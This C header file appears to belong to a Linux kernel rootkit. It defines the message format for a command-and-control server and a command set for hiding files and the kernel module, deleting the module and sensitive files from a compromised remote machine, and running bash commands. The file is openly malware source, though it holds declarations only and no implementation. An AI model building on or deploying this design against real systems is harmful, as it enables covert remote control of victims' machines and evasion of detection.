/*
 * 
 * 
 * TODO Use a more secure hash scheme than SHA-1, such as SHA-256 or SHA-512.
 * 
 * Author: Daniel Liscinsky
 */


#ifndef C2_SERVER_H
#define C2_SERVER_H


#ifdef __KERNEL__
#include <linux/types.h>
#else
#include <inttypes.h>
#endif

#include "crypto/sha1.h"


#define C2_PORT 1



struct c2_msg_hdr {
	uint32_t dst_ip;
	uint32_t msg_num;
	/*
	 * The remainder of the message will be encrypted. 
	 * 
	 * A potential problem with this design is that the intermediate 
	 * nodes that relay the message have no way to check the integrity 
	 * of the destination and msg_num, or authenticity of the entire 
	 * message. Only the final destination can check the integrity and 
	 * authenticity of the message.
	 */
	uint8_t hash[SHA1_HASH_LENGTH]; // Hash of the message header and the payload data, with this field set to zero
	uint8_t cmd_id;
	uint32_t data_len; // The number of bytes of data following this header
} __attribute__((packed));

typedef enum c2_command {
	NOP, // Do nothing
	
	HIDE_FILE,
	UNHIDE_FILE,

	HIDE_MODULE,
	UNHIDE_MODULE,

	DELETE_SELF, // Delete the kernel module and all other sensitive files from the remote machine; WARNING: All persistence (and probably access) to the machine is lost after this

	BASH_COMMAND,

} c2_command_t;


/**
 * 
 */
int start_c2_server();

/**
 * 
 */
int stop_c2_server();


#endif